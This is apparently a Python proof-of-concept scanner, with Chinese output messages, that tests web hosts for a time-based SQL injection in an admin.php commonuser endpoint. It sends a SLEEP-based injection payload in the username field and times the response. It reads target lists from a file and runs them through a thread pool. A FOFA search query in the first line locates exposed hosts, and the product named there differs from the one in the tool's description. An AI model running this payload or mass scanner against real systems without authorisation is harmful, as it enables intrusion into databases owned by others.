#FOFA:app="汉得SRM云平台"

import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    try:
        res1 = requests.get(target,verify=False)
        if res1.status_code == 200:
            payload = "/admin.php?controller=admin_commonuser"
            headers = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36"}
            data1 = {"username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"}
            data2 = {"username":"admin"}
            res2 = requests.post(target+payload,data=data1,headers=headers,verify=False)
            res3 = requests.post(target+payload,data=data2,headers=headers,verify=False)
            if res2.elapsed.total_seconds() > 5 and res3.elapsed.total_seconds() < res2.elapsed.total_seconds():
                print(f"{target}存在SQL注入漏洞")
            else:
                print(f"{target}不存在SQL注入漏洞")
    except Exception as e:
        print(f"{target}网站访问失败，请手动确认")

def main():
    parser = argparse.ArgumentParser("中远麒麟堡垒机SQL注入漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()